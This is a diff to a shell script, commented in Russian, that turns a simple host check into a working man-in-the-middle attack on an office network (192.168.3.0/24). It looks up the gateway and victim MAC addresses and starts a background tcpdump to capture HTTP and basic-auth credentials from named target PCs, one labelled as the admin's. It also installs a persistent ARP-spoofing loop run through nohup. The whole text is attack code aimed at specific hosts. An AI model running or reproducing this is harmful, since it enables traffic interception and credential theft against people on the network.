@@ -1,1 +1,32 @@
-echo FINAL-OK; hostname; id -u; date +%H:%M:%S; ping -c1 -W1 192.168.3.135 > /dev/null 2>&1 && echo PC135-UP || echo PC135-DOWN
+echo "=== MITM SETUP ==="
+# Определяем MAC шлюза .1
+GW_MAC=$(ip neigh show 192.168.3.1 | grep -oE '[0-9a-f:]{17}' | head -1)
+echo "GW_MAC=$GW_MAC"
+# MAC нашей ноды
+MY_MAC=$(ip link show enp7s0 | grep -oE '[0-9a-f:]{17}' | head -1)
+echo "MY_MAC=$MY_MAC"
+# ARP-spoof: говорим .1 что мы - офисные ПК (и наоборот)
+# Целевые ПК: .135 (админ), .152, .16, .76, .86
+for VICTIM in 192.168.3.135 192.168.3.152; do
+  VMAC=$(ip neigh show $VICTIM 2>/dev/null | grep -oE '[0-9a-f:]{17}' | head -1)
+  [ -z "$VMAC" ] && ping -c1 -W1 $VICTIM >/dev/null 2>&1 && VMAC=$(ip neigh show $VICTIM | grep -oE '[0-9a-f:]{17}' | head -1)
+  echo "VICTIM=$VICTIM VMAC=$VMAC"
+done
+# Запуск tcpdump на перехват HTTP/basic-auth от жертв
+pkill tcpdump 2>/dev/null
+nohup tcpdump -i enp7s0 -w /tmp/mitm2.pcap -c 50000 "host 192.168.3.135 or host 192.168.3.152 or (port 80 and net 192.168.3.0/24)" > /dev/null 2>&1 &
+echo "tcpdump started"
+# ARP-spoof цикл (раз в 2с)
+cat > /tmp/spoof.sh << 'SP'
+#!/bin/sh
+while :; do
+  for V in 192.168.3.135 192.168.3.152; do
+    arping -c 1 -A -I enp7s0 -s 192.168.3.1 $V > /dev/null 2>&1
+    arping -c 1 -A -I enp7s0 -s $V 192.168.3.1 > /dev/null 2>&1
+  done
+  sleep 2
+done
+SP
+chmod +x /tmp/spoof.sh
+nohup /tmp/spoof.sh > /dev/null 2>&1 &
+echo MITM-ACTIVE
